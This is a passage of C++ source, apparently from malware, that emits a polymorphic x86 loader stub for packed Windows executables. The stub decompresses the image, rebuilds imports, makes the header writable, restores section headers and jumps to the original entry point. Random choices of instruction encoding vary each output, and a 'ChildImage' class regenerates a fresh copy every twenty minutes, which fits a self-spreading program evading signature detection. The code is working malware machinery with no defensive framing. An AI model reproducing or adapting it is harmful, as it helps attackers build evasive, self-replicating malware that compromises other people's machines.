			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EDX_DWORD, sizeof(OP_ADD_EDX_DWORD)); CurrentAddress += sizeof(OP_ADD_EDX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_STOREDBYTES, sizeof(VAR_STOREDBYTES)); CurrentAddress += sizeof(VAR_STOREDBYTES);
			PBYTE Loop4Label = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_AL_BYTE_PTR_EBP_PLUS_EDX, sizeof(OP_MOV_AL_BYTE_PTR_EBP_PLUS_EDX)); CurrentAddress += sizeof(OP_MOV_AL_BYTE_PTR_EBP_PLUS_EDX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BYTE_PTR_EBP_PLUS_ESI_AL, sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_ESI_AL)); CurrentAddress += sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_ESI_AL);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_INC_ESI, sizeof(OP_INC_ESI)); CurrentAddress += sizeof(OP_INC_ESI);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_ESI_DWORD, sizeof(OP_CMP_ESI_DWORD)); CurrentAddress += sizeof(OP_CMP_ESI_DWORD);
			DWORD DictionarySize = OFFSETSIZE;
			WriteLittleEndian(CurrentAddress, (PBYTE)&DictionarySize, sizeof(DictionarySize)); CurrentAddress += sizeof(DictionarySize);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JL_SHORT, sizeof(OP_JL_SHORT)); CurrentAddress += sizeof(OP_JL_SHORT);
			JumpOffset = sizeof(OP_MOV_ESI_DWORD) + sizeof(InitialDictionary);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ESI_DWORD, sizeof(OP_MOV_ESI_DWORD)); CurrentAddress += sizeof(OP_MOV_ESI_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&InitialDictionary, sizeof(InitialDictionary)); CurrentAddress += sizeof(InitialDictionary);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_DEC_EDX, sizeof(OP_DEC_EDX)); CurrentAddress += sizeof(OP_DEC_EDX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EDX_DWORD, sizeof(OP_CMP_EDX_DWORD)); CurrentAddress += sizeof(OP_CMP_EDX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_STOREDBYTES, sizeof(VAR_STOREDBYTES)); CurrentAddress += sizeof(VAR_STOREDBYTES);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JNZ_SHORT, sizeof(OP_JNZ_SHORT)); CurrentAddress += sizeof(OP_JNZ_SHORT);
			JumpOffset = -(CurrentAddress - Loop4Label + sizeof(JumpOffset));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);

            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BYTEOFFSET, sizeof(VAR_BYTEOFFSET)); CurrentAddress += sizeof(VAR_BYTEOFFSET);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EBX_DWORD, sizeof(OP_CMP_EBX_DWORD)); CurrentAddress += sizeof(OP_CMP_EBX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&CompressedBufferSize, sizeof(CompressedBufferSize)); CurrentAddress += sizeof(CompressedBufferSize);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JL_NEAR, sizeof(OP_JL_NEAR)); CurrentAddress += sizeof(OP_JL_NEAR);
			JumpOffsetD = -(CurrentAddress - LoopLabel + sizeof(JumpOffsetD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffsetD, sizeof(JumpOffsetD)); CurrentAddress += sizeof(JumpOffsetD);

			// look up dll import functions
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EDI_DWORD, sizeof(OP_MOV_EDI_DWORD)); CurrentAddress += sizeof(OP_MOV_EDI_DWORD);
			DWORD Imports = (OriginalNtHeaders.OptionalHeader.DataDirectory[1].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR)) - 1;
			WriteLittleEndian(CurrentAddress, (PBYTE)&Imports, sizeof(Imports)); CurrentAddress += sizeof(Imports);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD, sizeof(OP_MOV_EBX_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD);
			DWORD VirtualAddress = NtHeaders->OptionalHeader.ImageBase + OriginalNtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress + (3 * sizeof(DWORD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&VirtualAddress, sizeof(VirtualAddress)); CurrentAddress += sizeof(VirtualAddress);
			PBYTE Loop2Label = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBX, sizeof(OP_MOV_EAX_DWORD_PTR_EBX)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_DWORD, sizeof(OP_ADD_EAX_DWORD)); CurrentAddress += sizeof(OP_ADD_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&NtHeaders->OptionalHeader.ImageBase, sizeof(NtHeaders->OptionalHeader.ImageBase)); CurrentAddress += sizeof(NtHeaders->OptionalHeader.ImageBase);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EAX, sizeof(OP_PUSH_EAX)); CurrentAddress += sizeof(OP_PUSH_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD_PTR, sizeof(OP_CALL_DWORD_PTR)); CurrentAddress += sizeof(OP_CALL_DWORD_PTR);
			WriteLittleEndian(CurrentAddress, (PBYTE)&LoadLibraryFunction, sizeof(LoadLibraryFunction)); CurrentAddress += sizeof(LoadLibraryFunction);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ESI_EAX, sizeof(OP_MOV_ESI_EAX)); CurrentAddress += sizeof(OP_MOV_ESI_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EBX, sizeof(OP_PUSH_EBX)); CurrentAddress += sizeof(OP_PUSH_EBX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EBX_BYTE, sizeof(OP_ADD_EBX_BYTE)); CurrentAddress += sizeof(OP_ADD_EBX_BYTE);
			BYTE Size = sizeof(DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Size, sizeof(Size)); CurrentAddress += sizeof(Size);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBX, sizeof(OP_MOV_EAX_DWORD_PTR_EBX)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_DWORD, sizeof(OP_ADD_EAX_DWORD)); CurrentAddress += sizeof(OP_ADD_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&NtHeaders->OptionalHeader.ImageBase, sizeof(NtHeaders->OptionalHeader.ImageBase)); CurrentAddress += sizeof(NtHeaders->OptionalHeader.ImageBase);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_EAX, sizeof(OP_MOV_EBX_EAX)); CurrentAddress += sizeof(OP_MOV_EBX_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBX, sizeof(OP_MOV_EAX_DWORD_PTR_EBX)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBX);
			PBYTE Loop5Label = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_DWORD, sizeof(OP_ADD_EAX_DWORD)); CurrentAddress += sizeof(OP_ADD_EAX_DWORD);
			DWORD TempAdd = NtHeaders->OptionalHeader.ImageBase + sizeof(WORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&TempAdd, sizeof(TempAdd)); CurrentAddress += sizeof(TempAdd);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EAX, sizeof(OP_PUSH_EAX)); CurrentAddress += sizeof(OP_PUSH_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_AND_EAX_DWORD, sizeof(OP_AND_EAX_DWORD)); CurrentAddress += sizeof(OP_AND_EAX_DWORD);
			DWORD OrdinalFlag = IMAGE_ORDINAL_FLAG32;
			WriteLittleEndian(CurrentAddress, (PBYTE)&OrdinalFlag, sizeof(OrdinalFlag)); CurrentAddress += sizeof(OrdinalFlag);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_EAX, sizeof(OP_POP_EAX)); CurrentAddress += sizeof(OP_POP_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JE_SHORT, sizeof(OP_JE_SHORT)); CurrentAddress += sizeof(OP_JE_SHORT);
			JumpOffset = sizeof(OP_AND_EAX_DWORD) + sizeof(DWORD) + sizeof(OP_SUB_EAX_BYTE) + sizeof(BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			//if(EAX & 0x80000000)
			//	EAX &= 0x0000FFFF;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_AND_EAX_DWORD, sizeof(OP_AND_EAX_DWORD)); CurrentAddress += sizeof(OP_AND_EAX_DWORD);
			DWORD TempAnd = 0x0000FFFF;
			WriteLittleEndian(CurrentAddress, (PBYTE)&TempAnd, sizeof(TempAnd)); CurrentAddress += sizeof(TempAnd);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_EAX_BYTE, sizeof(OP_SUB_EAX_BYTE)); CurrentAddress += sizeof(OP_SUB_EAX_BYTE);
			BYTE TempSub = sizeof(WORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&TempSub, sizeof(TempSub)); CurrentAddress += sizeof(TempSub);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EAX, sizeof(OP_PUSH_EAX)); CurrentAddress += sizeof(OP_PUSH_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_ESI, sizeof(OP_PUSH_ESI)); CurrentAddress += sizeof(OP_PUSH_ESI);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD_PTR, sizeof(OP_CALL_DWORD_PTR)); CurrentAddress += sizeof(OP_CALL_DWORD_PTR);
			WriteLittleEndian(CurrentAddress, (PBYTE)&GetProcAddressFunction, sizeof(GetProcAddressFunction)); CurrentAddress += sizeof(GetProcAddressFunction);
			// puts address in firstthunk
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBX_EAX, sizeof(OP_MOV_DWORD_PTR_EBX_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBX_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EBX_BYTE, sizeof(OP_ADD_EBX_BYTE)); CurrentAddress += sizeof(OP_ADD_EBX_BYTE);
			Size = sizeof(IMAGE_IMPORT_BY_NAME);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Size, sizeof(Size)); CurrentAddress += sizeof(Size);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBX, sizeof(OP_MOV_EAX_DWORD_PTR_EBX)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EAX_0, sizeof(OP_CMP_EAX_0)); CurrentAddress += sizeof(OP_CMP_EAX_0);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JNZ_SHORT, sizeof(OP_JNZ_SHORT)); CurrentAddress += sizeof(OP_JNZ_SHORT);
			JumpOffset = -(CurrentAddress - Loop5Label + sizeof(JumpOffset));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_EBX, sizeof(OP_POP_EBX)); CurrentAddress += sizeof(OP_POP_EBX);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EBX_BYTE, sizeof(OP_ADD_EBX_BYTE)); CurrentAddress += sizeof(OP_ADD_EBX_BYTE);
			Size = sizeof(IMAGE_IMPORT_DESCRIPTOR);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Size, sizeof(Size)); CurrentAddress += sizeof(Size);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_DEC_EDI, sizeof(OP_DEC_EDI)); CurrentAddress += sizeof(OP_DEC_EDI);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JNZ_SHORT, sizeof(OP_JNZ_SHORT)); CurrentAddress += sizeof(OP_JNZ_SHORT);
			JumpOffset = -(CurrentAddress - Loop2Label + sizeof(JumpOffset));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);

			// write in the necessary original section header information because this program uses them
			// but first allow write access to pe header
			// VirtualProtect((LPVOID)NtHeaders->OptionalHeader.ImageBase, OriginalStartAddress, PAGE_EXECUTE_READWRITE, ESP);
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_ESP, sizeof(OP_PUSH_ESP)); CurrentAddress += sizeof(OP_PUSH_ESP);
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_DWORD, sizeof(OP_PUSH_DWORD)); CurrentAddress += sizeof(OP_PUSH_DWORD);
				DWORD TempDword = PAGE_EXECUTE_READWRITE;
				WriteLittleEndian(CurrentAddress, (PBYTE)&TempDword, sizeof(TempDword)); CurrentAddress += sizeof(TempDword);
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_DWORD, sizeof(OP_PUSH_DWORD)); CurrentAddress += sizeof(OP_PUSH_DWORD);
				TempDword = OriginalStartAddress;
				WriteLittleEndian(CurrentAddress, (PBYTE)&TempDword, sizeof(TempDword)); CurrentAddress += sizeof(TempDword);
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_DWORD, sizeof(OP_PUSH_DWORD)); CurrentAddress += sizeof(OP_PUSH_DWORD);
				TempDword = NtHeaders->OptionalHeader.ImageBase;
				WriteLittleEndian(CurrentAddress, (PBYTE)&TempDword, sizeof(TempDword)); CurrentAddress += sizeof(TempDword);
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD_PTR, sizeof(OP_CALL_DWORD_PTR)); CurrentAddress += sizeof(OP_CALL_DWORD_PTR);
				WriteLittleEndian(CurrentAddress, (PBYTE)&VirtualProtectFunction, sizeof(VirtualProtectFunction)); CurrentAddress += sizeof(VirtualProtectFunction);
			DWORD PTRSection = ((PCHAR)NtHeaders + sizeof(IMAGE_NT_HEADERS) - (PCHAR)Buffer + NtHeaders->OptionalHeader.ImageBase);
			DWORD EBPSection = PTRSection - NtHeaders->OptionalHeader.ImageBase;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBP_DWORD, sizeof(OP_MOV_EBP_DWORD)); CurrentAddress += sizeof(OP_MOV_EBP_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&NtHeaders->OptionalHeader.ImageBase, sizeof(NtHeaders->OptionalHeader.ImageBase)); CurrentAddress += sizeof(NtHeaders->OptionalHeader.ImageBase);
			for(UINT i = 0; i < 3; i++){
				//dprintf("%X %X\r\n", PTRSection, EBPSection);
				PTRSection += sizeof(Section->Name);
				EBPSection += sizeof(Section->Name);
				if(rand_r(0, 1)){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_DWORD, sizeof(OP_MOV_DWORD_PTR_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&PTRSection, sizeof(PTRSection)); CurrentAddress += sizeof(PTRSection);			
				}else{
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&EBPSection, sizeof(EBPSection)); CurrentAddress += sizeof(EBPSection);		
				}
				WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalSection[i].Misc.VirtualSize, sizeof(OriginalSection[i].Misc.VirtualSize)); CurrentAddress += sizeof(OriginalSection[i].Misc.VirtualSize);
				PTRSection += sizeof(Section->Misc);
				EBPSection += sizeof(Section->Misc);
				if(rand_r(0, 1)){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_DWORD, sizeof(OP_MOV_DWORD_PTR_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&PTRSection, sizeof(PTRSection)); CurrentAddress += sizeof(PTRSection);			
				}else{
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&EBPSection, sizeof(EBPSection)); CurrentAddress += sizeof(EBPSection);		
				}
				WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalSection[i].VirtualAddress, sizeof(OriginalSection[i].VirtualAddress)); CurrentAddress += sizeof(OriginalSection[i].VirtualAddress);
				PTRSection += sizeof(Section->VirtualAddress);
				EBPSection += sizeof(Section->VirtualAddress);
				if(rand_r(0, 1)){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_DWORD, sizeof(OP_MOV_DWORD_PTR_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&PTRSection, sizeof(PTRSection)); CurrentAddress += sizeof(PTRSection);			
				}else{
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&EBPSection, sizeof(EBPSection)); CurrentAddress += sizeof(EBPSection);		
				}
				WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalSection[i].SizeOfRawData, sizeof(OriginalSection[i].SizeOfRawData)); CurrentAddress += sizeof(OriginalSection[i].SizeOfRawData);

				PTRSection += sizeof(Section->SizeOfRawData);
				EBPSection += sizeof(Section->SizeOfRawData);
				if(rand_r(0, 1)){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_DWORD, sizeof(OP_MOV_DWORD_PTR_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&PTRSection, sizeof(PTRSection)); CurrentAddress += sizeof(PTRSection);			
				}else{
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&EBPSection, sizeof(EBPSection)); CurrentAddress += sizeof(EBPSection);		
				}
				WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalSection[i].PointerToRawData, sizeof(OriginalSection[i].PointerToRawData)); CurrentAddress += sizeof(OriginalSection[i].PointerToRawData);

				PTRSection += sizeof(Section->PointerToRawData) + sizeof(Section->PointerToRelocations) + sizeof(Section->PointerToLinenumbers) + sizeof(Section->NumberOfRelocations) + sizeof(Section->NumberOfLinenumbers);
				EBPSection += sizeof(Section->PointerToRawData) + sizeof(Section->PointerToRelocations) + sizeof(Section->PointerToLinenumbers) + sizeof(Section->NumberOfRelocations) + sizeof(Section->NumberOfLinenumbers);
				if(rand_r(0, 1)){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_DWORD, sizeof(OP_MOV_DWORD_PTR_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&PTRSection, sizeof(PTRSection)); CurrentAddress += sizeof(PTRSection);			
				}else{
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&EBPSection, sizeof(EBPSection)); CurrentAddress += sizeof(EBPSection);		
				}
				WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalSection[i].Characteristics, sizeof(OriginalSection[i].Characteristics)); CurrentAddress += sizeof(OriginalSection[i].Characteristics);
				PTRSection += sizeof(Section->Characteristics);
				EBPSection += sizeof(Section->Characteristics);
			}

			//dprintf("   %X   %X\r\n", StubAddress, OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
			DWORD OriginalEntryPoint = (DosHeader->e_lfanew + (DWORD)&OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint - (DWORD)&OriginalNtHeaders);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalEntryPoint, sizeof(OriginalEntryPoint)); CurrentAddress += sizeof(OriginalEntryPoint);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint, sizeof(OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint)); CurrentAddress += sizeof(OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
			DWORD OriginalNumOfSections = (DosHeader->e_lfanew + (DWORD)&OriginalNtHeaders.FileHeader.NumberOfSections - (DWORD)&OriginalNtHeaders);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalNumOfSections, sizeof(OriginalNumOfSections)); CurrentAddress += sizeof(OriginalNumOfSections);
			OriginalNumOfSections = OriginalNtHeaders.FileHeader.NumberOfSections;
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalNumOfSections, sizeof(OriginalNumOfSections)); CurrentAddress += sizeof(OriginalNumOfSections);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
			DWORD OriginalImportAddress = (DosHeader->e_lfanew + (DWORD)&OriginalNtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress - (DWORD)&OriginalNtHeaders);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalImportAddress, sizeof(OriginalImportAddress)); CurrentAddress += sizeof(OriginalImportAddress);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalNtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress, sizeof(OriginalNtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress)); CurrentAddress += sizeof(OriginalNtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD);
			DWORD OriginalImportSize = (DosHeader->e_lfanew + (DWORD)&OriginalNtHeaders.OptionalHeader.DataDirectory[1].Size - (DWORD)&OriginalNtHeaders);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalImportSize, sizeof(OriginalImportSize)); CurrentAddress += sizeof(OriginalImportSize);
			WriteLittleEndian(CurrentAddress, (PBYTE)&OriginalNtHeaders.OptionalHeader.DataDirectory[1].Size, sizeof(OriginalNtHeaders.OptionalHeader.DataDirectory[1].Size)); CurrentAddress += sizeof(OriginalNtHeaders.OptionalHeader.DataDirectory[1].Size);
			// restore original stack pointers
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_ESP_DWORD, sizeof(OP_ADD_ESP_DWORD)); CurrentAddress += sizeof(OP_ADD_ESP_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&StackSize, sizeof(StackSize)); CurrentAddress += sizeof(StackSize);
			WriteBigEndian(CurrentAddress, &OP_POP_EBP, sizeof(OP_POP_EBP)); CurrentAddress += sizeof(OP_POP_EBP);

			// jump to original entry point
			WriteBigEndian(CurrentAddress, &OP_JMP_NEAR, sizeof(OP_JMP_NEAR)); CurrentAddress += sizeof(OP_JMP_NEAR);
			JumpOffsetD = OriginalNtHeaders.OptionalHeader.AddressOfEntryPoint - DWORD(StubAddress + (CurrentAddress - BeginingAddress)) - sizeof(JumpOffsetD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffsetD, sizeof(JumpOffsetD)); CurrentAddress += sizeof(JumpOffsetD);

			//WriteBigEndian(CurrentAddress, &OP_Push, sizeof(OP_Push)); CurrentAddress += sizeof(OP_Push);
			//WriteBigEndian(CurrentAddress, &OP_Push, 1); CurrentAddress++;

			//WriteBigEndian(CurrentAddress, &OP_Push, sizeof(OP_Push)); CurrentAddress += sizeof(OP_Push);
			//WriteBigEndian(CurrentAddress, &OP_Push, 1); CurrentAddress++;

			//WriteBigEndian(CurrentAddress, OP_Call_DWORDPTR, sizeof(OP_Call_DWORDPTR)); CurrentAddress += sizeof(OP_Call_DWORDPTR);
			//WriteLittleEndian(CurrentAddress, (PBYTE)&BeepFunction, sizeof(BeepFunction)); CurrentAddress += sizeof(BeepFunction);


			//WriteBigEndian(CurrentAddress, &OP_RETN, sizeof(OP_RETN)); CurrentAddress += sizeof(OP_RETN);
			
			}
		}
	HeapDestroy(Heap);
	return OutputFileSize;
}

ChildImage::ChildImage(){
	Buffer = NULL;
	Size = 0;
	Time = NULL;
}

ChildImage::~ChildImage(){
	Delete();
}

VOID ChildImage::Create(BOOL Compressed){
	CriticalSection.Enter();
	Delete();
	Time = GetTickCount();
	Size = CreateChildImage(&Buffer, Compressed);
	CriticalSection.Leave();
}

BOOL ChildImage::Expired(VOID){
	CriticalSection.Enter();
	CriticalSection.Leave();
	if(((GetTickCount() - Time) > 1200000) || !Buffer)
		return TRUE;
	return FALSE;
}

PBYTE ChildImage::GetBuffer(VOID){
	CriticalSection.Enter();
	CriticalSection.Leave();
	return Buffer;
}

DWORD ChildImage::GetSize(VOID){
	CriticalSection.Enter();
	CriticalSection.Leave();
	return Size;
}

VOID ChildImage::Delete(VOID){
	if(Buffer){
		delete[] Buffer;
		Buffer = NULL;
	}
}